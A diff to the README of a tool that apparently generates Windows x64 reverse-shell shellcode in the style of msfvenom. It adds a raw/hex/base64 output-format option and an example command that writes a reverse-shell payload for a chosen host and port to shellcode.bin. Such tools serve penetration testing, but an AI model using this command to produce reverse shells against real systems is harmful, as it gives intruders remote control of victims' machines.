@@ -6,6 +6,8 @@ msfvenom windows/x64/shell_reverse_tcp payload generator without dependencies
 ```
 $ ./shell_reverse_tcp -h
 Usage of ./shell_reverse_tcp:
+  -format string
+        Format: {raw, hex, base64} (default "raw")
   -host string
         Host IP address (default "127.0.0.1")
   -port int
@@ -15,7 +17,7 @@ Usage of ./shell_reverse_tcp:
 ## Example
 
 ```
-$ ./shell_reverse_tcp -host 192.168.100.100 -port 4444 > shellcode.bin
+$ ./shell_reverse_tcp -host 192.168.1.2 -port 4444 -format raw > shellcode.bin
 ```
 
 # Build
